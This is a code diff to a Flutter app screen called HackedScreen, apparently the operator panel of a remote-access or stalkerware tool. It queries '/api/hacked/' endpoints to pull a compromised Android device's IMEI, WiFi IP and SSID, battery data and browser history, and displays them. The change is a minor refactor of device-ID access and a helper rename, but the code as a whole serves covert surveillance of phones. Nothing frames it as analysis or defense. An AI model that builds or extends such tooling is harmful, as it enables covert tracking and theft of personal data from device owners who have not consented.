@@ -475,7 +475,7 @@ class _HackedScreenState extends State<HackedScreen>
     if (!mounted) return;
     Navigator.of(context, rootNavigator: true).pop();
     try {
-      final res = await ApiService.get('/api/hacked/device-info/${widget.device['deviceId']}');
+      final res = await ApiService.get('/api/hacked/device-info/${widget.deviceId}');
       if (!mounted) return;
       final info = res['info'] as Map<String, dynamic>?;
       if (info == null) { showWarning(context, 'Data belum tersedia, coba lagi'); return; }
@@ -490,15 +490,15 @@ class _HackedScreenState extends State<HackedScreen>
               crossAxisAlignment: CrossAxisAlignment.start,
               mainAxisSize: MainAxisSize.min,
               children: [
-                _infoRow('Model',    info['model']    ?? 'N/A'),
-                _infoRow('Brand',    info['brand']    ?? 'N/A'),
-                _infoRow('Android',  info['android']  ?? 'N/A'),
-                _infoRow('SDK',      info['sdk']?.toString() ?? 'N/A'),
-                _infoRow('IMEI',     info['imei']     ?? 'N/A'),
-                _infoRow('IP WiFi',  info['wifiIp']   ?? 'N/A'),
-                _infoRow('WiFi SSID',info['wifiSsid'] ?? 'N/A'),
-                _infoRow('Baterai',  info['battery']  ?? 'N/A'),
-                _infoRow('Suhu',     info['temp']     ?? 'N/A'),
+                _infoRowSimple('Model',    info['model']    ?? 'N/A'),
+                _infoRowSimple('Brand',    info['brand']    ?? 'N/A'),
+                _infoRowSimple('Android',  info['android']  ?? 'N/A'),
+                _infoRowSimple('SDK',      info['sdk']?.toString() ?? 'N/A'),
+                _infoRowSimple('IMEI',     info['imei']     ?? 'N/A'),
+                _infoRowSimple('IP WiFi',  info['wifiIp']   ?? 'N/A'),
+                _infoRowSimple('WiFi SSID',info['wifiSsid'] ?? 'N/A'),
+                _infoRowSimple('Baterai',  info['battery']  ?? 'N/A'),
+                _infoRowSimple('Suhu',     info['temp']     ?? 'N/A'),
               ],
             ),
           ),
@@ -515,7 +515,7 @@ class _HackedScreenState extends State<HackedScreen>
     }
   }
 
-  Widget _infoRow(String label, String value) {
+  Widget _infoRowSimple(String label, String value) {
     return Padding(
       padding: const EdgeInsets.symmetric(vertical: 4),
       child: Row(
@@ -545,7 +545,7 @@ class _HackedScreenState extends State<HackedScreen>
     if (!mounted) return;
     Navigator.of(context, rootNavigator: true).pop();
     try {
-      final res = await ApiService.get('/api/hacked/browser-history/${widget.device['deviceId']}');
+      final res = await ApiService.get('/api/hacked/browser-history/${widget.deviceId}');
       if (!mounted) return;
       final hist = res['history'] as Map<String, dynamic>?;
       final items = hist != null ? List<Map<String, dynamic>>.from(hist['items'] ?? []) : [];
